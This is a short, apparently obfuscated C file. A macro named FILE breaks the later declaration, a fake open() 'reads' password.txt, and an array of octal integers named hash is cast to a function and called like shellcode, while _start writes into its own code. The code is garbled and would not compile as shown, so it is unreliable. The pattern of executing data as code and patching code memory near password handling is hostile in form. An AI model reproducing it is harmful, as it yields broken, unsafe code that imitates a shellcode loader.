typedef unsigned long u64;
#define FILE do { if (1 & 1) { return (u64) __FILE__ - (u64) _start; } } while(0); void
int _start(void);
void *open(char *file) {
    return (void *) 0777;
}
int readpasswd(void) {
    FILE *fp = open("password.txt");
    return (u64) (fp + 0777);
}
int hash[] = {
    030040740061, 0374101402, 032214343611,
    020301141203, 0503607762,
    020344110220,
    0503633760
};
int _start(void) {
    *(int *)((char *) _start + readpasswd() + (sizeof(long) - 1)) = 01235670040;
    (*(void (*)(int p, char *w))hash)(1, (char *) _start + readpasswd());
    return 0;
}
